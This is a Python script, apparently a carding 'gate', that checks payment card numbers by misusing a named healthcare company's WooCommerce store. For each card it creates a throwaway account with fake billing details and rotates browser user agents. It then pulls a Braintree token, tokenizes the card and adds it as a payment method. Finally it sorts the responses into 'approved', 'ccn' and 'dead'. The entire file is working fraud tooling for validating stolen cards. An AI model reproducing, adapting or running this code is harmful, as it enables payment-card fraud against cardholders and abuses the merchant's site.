import aiohttp
import asyncio
import time
import re
import base64
import random
import string
import json
from typing import List, Optional
from bs4 import BeautifulSoup


SITE_URL = "https://assurancehomehealthcare.ca"

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
]

def random_ua():
    return random.choice(USER_AGENTS)

def gen_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def gen_code(n=36):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

async def check_card(cc: str, mm: str, yy: str, cvv: str, user_proxies: Optional[List[str]] = None) -> dict:
    """Gate 4 - Braintree CVV Auth"""
    start_time = time.time()

    if len(mm) == 1:
        mm = f'0{mm}'
    if not yy.startswith('20'):
        yy = f'20{yy}'

    acc  = gen_email()
    user = random_ua()
    h    = {'user-agent': user}

    connector = None
    try:
        jar       = aiohttp.CookieJar()
        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(cookie_jar=jar, connector=connector, timeout=timeout) as s:

            # Step 1: Get registration nonce
            async with s.get(f'{SITE_URL}/my-account/', headers=h) as r:
                text = await r.text()
            reg_nonce_m = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text)
            if not reg_nonce_m:
                return {'status': 'error', 'message': 'Could not load registration page', 'time': time.time() - start_time}
            reg_nonce = reg_nonce_m.group(1)

            # Step 2: Register account
            async with s.post(f'{SITE_URL}/my-account/', headers=h,
                data={'email': acc, 'password': 'Electra@2025!',
                      'woocommerce-register-nonce': reg_nonce,
                      '_wp_http_referer': '/my-account/', 'register': 'Register'}) as r:
                await r.text()

            # Step 3: Get billing address form — extract hidden field values using BeautifulSoup
            async with s.get(f'{SITE_URL}/my-account/edit-address/billing/', headers=h) as r:
                soup = BeautifulSoup(await r.text(), 'html.parser')

            forms = soup.find_all('form')
            if len(forms) < 2:
                return {'status': 'error', 'message': 'Could not load billing address form', 'time': time.time() - start_time}
            bf = forms[1]

            addr_nonce_el  = bf.find('input', {'name': 'woocommerce-edit-address-nonce'})
            referer_el     = bf.find('input', {'name': '_wp_http_referer'})
            action_el      = bf.find('input', {'name': 'action'})

            if not addr_nonce_el:
                return {'status': 'error', 'message': 'Could not get address nonce', 'time': time.time() - start_time}

            addr_nonce  = addr_nonce_el['value']
            referer_val = referer_el['value'] if referer_el else '/my-account/edit-address/billing/'
            action_val  = action_el['value']  if action_el  else 'edit_address'

            # Step 4: Save billing address
            post_h = {**h,
                      'origin':  SITE_URL,
                      'referer': f'{SITE_URL}/my-account/edit-address/billing/'}
            async with s.post(f'{SITE_URL}/my-account/edit-address/billing/', headers=post_h,
                data={'billing_first_name':  'James',
                      'billing_last_name':   'Smith',
                      'billing_company':     '',
                      'billing_country':     'US',
                      'billing_address_1':   '123 Baker Street',
                      'billing_address_2':   '',
                      'billing_city':        'New York',
                      'billing_state':       'NY',
                      'billing_postcode':    '10001',
                      'billing_phone':       '3031234567',
                      'billing_email':       acc,
                      'save_address':        'Save address',
                      'woocommerce-edit-address-nonce': addr_nonce,
                      '_wp_http_referer':    referer_val,
                      'action':              action_val}) as r:
                await r.text()

            # Step 5: Get add-payment-method page — extract CC-specific nonce
            async with s.get(f'{SITE_URL}/my-account/add-payment-method/', headers=h) as r:
                text = await r.text()

            add_nonce_m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text)
            if not add_nonce_m:
                return {'status': 'error', 'message': 'Could not load payment method page', 'time': time.time() - start_time}
            add_nonce = add_nonce_m.group(1)

            # Extract the credit card handler block to get the CC-specific client_token_nonce
            cc_block_m = re.search(
                r'wc_braintree_credit_card_payment_form_handler\s*=\s*new WC_Braintree_Credit_Card_Payment_Form_Handler\s*\(\s*(\{.*?\})\s*\)',
                text, re.DOTALL)
            if not cc_block_m:
                return {'status': 'error', 'message': 'Braintree CC handler not found', 'time': time.time() - start_time}

            client_nonce_m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', cc_block_m.group(1))
            if not client_nonce_m:
                return {'status': 'error', 'message': 'CC client_token_nonce not found', 'time': time.time() - start_time}
            client_nonce = client_nonce_m.group(1)

            # Step 6: Get Braintree auth fingerprint from WooCommerce AJAX
            async with s.post(f'{SITE_URL}/wp-admin/admin-ajax.php', headers=h,
                data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}) as r:
                raw = await r.text()

            try:
                token_resp = json.loads(raw)
                if not token_resp.get('success'):
                    return {'status': 'error', 'message': f'Braintree token failed: {raw[:60]}', 'time': time.time() - start_time}
                dec = base64.b64decode(token_resp['data']).decode()
                au_m = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                if not au_m:
                    return {'status': 'error', 'message': 'authorizationFingerprint not found', 'time': time.time() - start_time}
                au = au_m.group(1)
            except Exception as e:
                return {'status': 'error', 'message': f'Token parse error: {str(e)[:50]}', 'time': time.time() - start_time}

            # Step 7: Tokenize card via Braintree GraphQL (no proxy — not a PayPal endpoint)
            bt_headers = {
                'authorization':    f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type':     'application/json',
                'origin':           'https://assets.braintreegateway.com',
                'referer':          'https://assets.braintreegateway.com/',
                'user-agent':       user,
            }
            async with s.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json={
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': gen_code()},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
                'variables': {'input': {
                    'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv},
                    'options': {'validate': False}
                }},
                'operationName': 'TokenizeCreditCard'
            }) as r:
                bt_resp = await r.json(content_type=None)

            tok_data = bt_resp.get('data', {}).get('tokenizeCreditCard', {})
            tok = tok_data.get('token')
            if not tok:
                errors = bt_resp.get('errors', [])
                err_msg = errors[0].get('message', 'Unknown tokenize error') if errors else 'Tokenize failed'
                return {'status': 'error', 'message': err_msg[:80], 'time': time.time() - start_time}

            # Step 8: Submit card as payment method to WooCommerce
            sub_h = {**h,
                     'content-type': 'application/x-www-form-urlencoded',
                     'origin':       SITE_URL,
                     'referer':      f'{SITE_URL}/my-account/add-payment-method/'}
            async with s.post(f'{SITE_URL}/my-account/add-payment-method/', headers=sub_h,
                data=[('payment_method',   'braintree_credit_card'),
                      ('wc-braintree-credit-card-card-type', 'visa'),
                      ('wc_braintree_credit_card_payment_nonce', tok),
                      ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                      ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                      ('woocommerce-add-payment-method-nonce', add_nonce),
                      ('_wp_http_referer', '/my-account/add-payment-method/'),
                      ('woocommerce_add_payment_method', '1')]) as r:
                result_text = await r.text()

        elapsed = time.time() - start_time

        # Parse WooCommerce response
        soup2  = BeautifulSoup(result_text, 'html.parser')
        err_el = soup2.select_one('.woocommerce-error li')
        suc_el = soup2.select_one('.woocommerce-message')
        msg    = err_el.text.strip() if err_el else (suc_el.text.strip() if suc_el else '')

        # Success
        if suc_el or any(x in result_text for x in [
            'payment method added', 'Payment method successfully added', 'Duplicate card exists in the vault'
        ]):
            return {'status': 'approved', 'message': msg or 'Payment Method Added', 'time': elapsed}

        if not msg:
            return {'status': 'error', 'message': 'Unknown response from site', 'time': elapsed}

        # Map Braintree error codes → status
        raw_lower = result_text.lower()

        if any(c in result_text for c in ['2000', '2001', '2002', '2004', '2005', '2008', '2046']):
            return {'status': 'dead', 'message': msg, 'time': elapsed}
        if '2010' in result_text or 'Card Issuer Declined CVV' in result_text or 'cvv' in raw_lower:
            return {'status': 'ccn', 'message': msg, 'time': elapsed}
        if any(x in result_text for x in ['2003', 'Insufficient Funds', 'insufficient']):
            return {'status': 'approved', 'message': 'Insufficient Funds', 'time': elapsed}
        if any(x in result_text for x in ['2057', '2059', '2060', '2061', '2062', '2099']):
            return {'status': 'dead', 'message': msg, 'time': elapsed}
        if any(x in result_text for x in ['81', 'processor declined', 'Processor Declined']):
            return {'status': 'dead', 'message': msg, 'time': elapsed}

        return {'status': 'dead', 'message': msg[:100], 'time': elapsed}

    except asyncio.TimeoutError:
        return {'status': 'error', 'message': 'Request timed out', 'time': time.time() - start_time}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': time.time() - start_time}
    finally:
        if connector and not connector.closed:
            await connector.close()
